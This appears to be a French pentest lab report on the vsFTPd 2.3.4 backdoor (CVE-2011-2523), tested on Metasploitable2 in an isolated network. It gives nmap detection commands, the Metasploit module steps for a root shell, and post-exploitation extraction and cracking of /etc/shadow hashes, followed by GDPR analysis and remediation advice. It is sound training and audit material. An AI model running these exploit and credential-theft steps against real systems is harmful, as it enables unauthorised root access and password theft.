# CVE-2011-2523 - vsFTPd 2.3.4 Backdoor

## Cible
- IP : 192.168.56.20 (Metasploitable2)
- Service : FTP (port 21)
- Version : vsFTPd 2.3.4

## Reconnaissance
Scan Nmap de détection de services :
nmap -sV 192.168.56.20
Résultat : port 21 ouvert, vsFTPd 2.3.4 détecté.

## Détection de la faille
nmap --script ftp-vsftpd-backdoor 192.168.56.20
Résultat : VULNERABLE — CVE-2011-2523, accès root confirmé.

## Exploitation
Via Metasploit :
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.56.20
set LHOST 192.168.56.10
run
Résultat : session Meterpreter ouverte, uid=root.

## Post-exploitation
- Lecture de /etc/passwd : 30 utilisateurs identifiés
- Extraction de /etc/shadow : hashes MD5 récupérés
- Cassage du hash msfadmin avec John the Ripper : mot de passe = msfadmin (< 1 seconde)

## Impact
Accès root complet sur la machine. Tous les fichiers, 
services et données accessibles sans restriction.

## Lien RGPD
- Violation potentielle des articles 25 et 32 du RGPD
  (sécurité dès la conception, mesures techniques appropriées)
- Mot de passe trivial = absence de politique de mots de passe
- Service FTP non chiffré = données en transit non protégées

## Recommandations
1. Mettre à jour vsFTPd vers une version non vulnérable
2. Remplacer FTP par SFTP (chiffré)
3. Imposer une politique de mots de passe forts
4. Désactiver les services inutiles

## Environnement
Test réalisé sur Metasploitable2 dans un réseau 
virtuel isolé. Aucun système tiers ciblé.
